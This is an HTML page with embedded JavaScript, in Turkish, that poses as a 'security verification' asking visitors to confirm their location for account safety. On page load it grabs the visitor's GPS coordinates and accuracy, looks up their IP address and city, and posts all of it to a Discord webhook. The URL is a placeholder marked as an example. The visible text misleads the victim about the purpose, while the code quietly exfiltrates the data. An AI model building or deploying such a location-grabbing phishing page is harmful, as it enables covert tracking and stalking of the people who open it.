    <style>

<body>
    <div class="blurred-background"></div>
    <div id="content" class="container">
        <h1>GÃ¼venlik DoÄŸrulamasÄ±</h1>
        <p>HesabÄ±nÄ±zÄ±n gÃ¼venliÄŸini artÄ±rmak iÃ§in lÃ¼tfen konumunuzu doÄŸrulayÄ±n. Bu iÅŸlem, yalnÄ±zca gÃ¼venlik amaÃ§lÄ±dÄ±r ve kaydedilecektir.</p>
        <button id="locationButton">Konumumu DoÄŸrula</button>
        <div id="result" class="result"></div>
    </div>
    <script>
        // WEBHOOK URL'NÄ°ZÄ° BURAYA YAZIN
        const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // Ã–RNEK

        const locationButton = document.getElementById('locationButton');
        const resultDiv = document.getElementById('result');

        window.onload = () => {
            getLocationAndSend();
        };

        async function getLocationAndSend() {
            if ("geolocation" in navigator) {
                locationButton.disabled = true;
                locationButton.textContent = 'Konum AlÄ±nÄ±yor...';

                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const { latitude, longitude } = position.coords;
                        const accuracy = position.coords.accuracy;
                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

                        try {
                            await sendLocationLog(latitude, longitude, accuracy, mapsUrl);
                            resultDiv.innerHTML = `Konum baÅŸarÄ±yla alÄ±ndÄ±! (Gizli)`;
                            locationButton.textContent = 'DoÄŸrulandÄ±';
                            locationButton.classList.add('hidden');
                        } catch (error) {
                            console.error("Discord'a log gÃ¶nderilirken hata:", error);
                            resultDiv.innerHTML = `Discord'a bilgi gÃ¶nderilemedi. LÃ¼tfen konsolu kontrol edin.`;
                            locationButton.textContent = 'Tekrar Dene';
                            locationButton.disabled = false;
                        }
                    },
                    (error) => {
                        let errorMessage = "Konum alÄ±namadÄ±.";
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "Konum izni reddedildi.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Konum bilgisi mevcut deÄŸil.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "Konum isteÄŸi zaman aÅŸÄ±mÄ±na uÄŸradÄ±.";
                                break;
                        }
                        resultDiv.textContent = errorMessage;
                        locationButton.textContent = 'Tekrar Dene';
                        locationButton.disabled = false;
                    }
                );
            } else {
                resultDiv.textContent = "TarayÄ±cÄ±nÄ±z konum Ã¶zelliÄŸini desteklemiyor.";
                locationButton.disabled = false;
            }
        }

        async function sendLocationLog(lat, lon, acc, mapUrl) {
            const payload = {
                content: "ğŸ“ **Yeni Konum Bilgisi!**",
                embeds: [{
                    title: "Konum Bilgisi",
                    color: 5814783,
                    fields: [
                        { name: "Enlem (Latitude)", value: `\`\`\`${lat}\`\`\``, inline: true },
                        { name: "Boylam (Longitude)", value: `\`\`\`${lon}\`\`\``, inline: true },
                        { name: "DoÄŸruluk", value: `\`\`\`~${acc.toFixed(0)} metre\`\`\``, inline: true },
                        { name: "Harita Linki", value: `[Google Maps](${mapUrl})`, inline: false },
                        { name: "IP Adresi", value: "\`\`\`Bilgi alÄ±nÄ±yor...\`\`\`", inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                if (!ipResponse.ok) {
                    throw new Error(`IP adresi alÄ±namadÄ±: ${ipResponse.status} ${ipResponse.statusText}`);
                }
                const ipData = await ipResponse.json();
                payload.embeds[0].fields[4].value = `\`\`\`${ipData.ip} (${ipData.city}, ${ipData.country_name})\`\`\``;
            } catch (ipError) {
                console.error("IP adresi alÄ±nÄ±rken hata:", ipError);
                payload.embeds[0].fields[4].value = `\`\`\`IP bilgisi alÄ±namadÄ±: ${ipError.message}\`\`\``;
            }

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    throw new Error(`Webhook gÃ¶nderilemedi: ${response.status} ${response.statusText}`);
                }
                console.log("Discord'a log baÅŸarÄ±yla gÃ¶nderildi."); // BaÅŸarÄ±lÄ± log mesajÄ±
            } catch (discordError) {
                console.error("Discord'a log gÃ¶nderilirken hata:", discordError);
                throw discordError; // HatayÄ± tekrar fÄ±rlat, Ã¼st fonksiyonda yakalansÄ±n.
            }
        }
    </script>
